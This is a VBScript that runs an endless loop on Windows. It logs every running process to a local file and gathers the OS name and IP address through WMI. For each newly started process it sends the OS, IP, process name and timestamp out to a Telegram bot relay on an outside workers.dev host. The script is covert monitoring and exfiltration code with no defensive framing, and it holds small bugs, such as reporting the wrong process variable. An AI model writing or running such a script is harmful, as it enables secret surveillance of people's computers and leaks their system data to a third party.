Option Explicit

Dim fso, logFile, logPath
Dim colProcesses, objProcess
Dim intervalSeconds
intervalSeconds = 5

Dim previousProcesses, shell

Set previousProcesses = CreateObject("Scripting.Dictionary")
Set shell = CreateObject("Wscript.Shell")

shell.Run "log.txt"
Set shell = Nothing

logPath = "log.txt"

Do
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set logFile = fso.OpenTextFile(logPath, 8, True)
    Set colProcesses = GetObject("winmgmts:\\.\root\CIMV2").ExecQuery("SELECT * FROM Win32_Process")
    Dim colProcesses2, objProcess2, os, ip, currentProcesses
    Set colProcesses2 = GetObject("winmgmts:\\.\root\CIMV2").ExecQuery("SELECT Name FROM Win32_Process")
    Set os = GetObject("winmgmts:\\.\root\CIMV2").ExecQuery("SELECT Caption FROM Win32_OperatingSystem").ItemIndex(0)
    Set ip = GetObject("winmgmts:\\.\root\CIMV2").ExecQuery("SELECT IPAddress, IPEnabled FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True").ItemIndex(0)
    Set currentProcesses = CreateObject("Scripting.Dictionary")

    For Each objProcess In colProcesses
        logFile.WriteLine objProcess.Name & " - " & Time & " - " & Date
    Next
    logFile.Close

    For Each objProcess2 In colProcesses2
        currentProcesses(objProcess2.Name) = True
        If Not previousProcesses.Exists(objProcess2.Name) Then
            Dim http
            Set http = CreateObject("MSXML2.ServerXMLHTTP")
            On Error Resume Next
            http.Open "GET", "https://telegram.mrsaad.workers.dev/bot{TOKEN}/sendMessage?chat_id={ID}&text=" & os.Caption & " - " & ip.IPAddress(0) & " : " & objProcess.Name & " - " & Time & " - " & Date, False
            http.Send
        End If
    Next

    Set fso = Nothing
    Set previousProcesses = currentProcesses
    WScript.Sleep intervalSeconds * 100
Loop
